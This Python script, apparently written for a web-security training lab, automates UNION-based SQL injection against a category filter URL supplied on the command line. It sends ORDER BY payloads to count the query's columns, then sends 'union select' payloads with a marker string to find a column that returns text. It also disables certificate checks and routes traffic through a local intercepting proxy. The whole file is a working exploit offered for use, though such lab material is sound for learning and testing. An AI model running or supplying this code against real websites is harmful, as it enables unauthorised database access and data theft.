# Finding data type in column

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

path = "/filter?category=Gifts"


def exploit_sqli_string_field(url,num_cols):
    for i in range(1,num_cols+1):
        payload_list = ['null'] * num_cols
        payload_list[i-1] = string
        sql_payload = f"'+union+select+{','.join(payload_list)}+--"
        print(sql_payload)
        r = requests.get(url+path+sql_payload,verify=False,proxies=proxies)
        if string.strip("'") in r.text:
            return i
    return False


def exploit_sqli_num_cols(url):
    for i in range(1,10):
        sql_payload = f"'+ORDER+BY+{i}--"
        r = requests.get(url+path+sql_payload, verify=False, proxies=proxies)
        if "Internal Server Error" in r.text:
            return i-1
    return False



if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        string = sys.argv[2].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} \"<url>\" \"'<string>'\"")
        print(f"[-] Example: {sys.argv[0]} \"www.example.com\" \"'vg467x'\" ")
        sys.exit(-1)
        
    print("[+] Determining Number of Columns." )

    num_cols = exploit_sqli_num_cols(url)

    if num_cols:
        print(f"The number of column is: {num_cols}.")

        print("[+] Figuring out which column contains text.....")
        string_cols = exploit_sqli_string_field(url, num_cols)

        if string_cols:
            print(f"[+] The column that contains text is: {string_cols}.")
        else:
            print("[-] Not able to find column that contains text...")
    else:
        print("SQL injection failed.")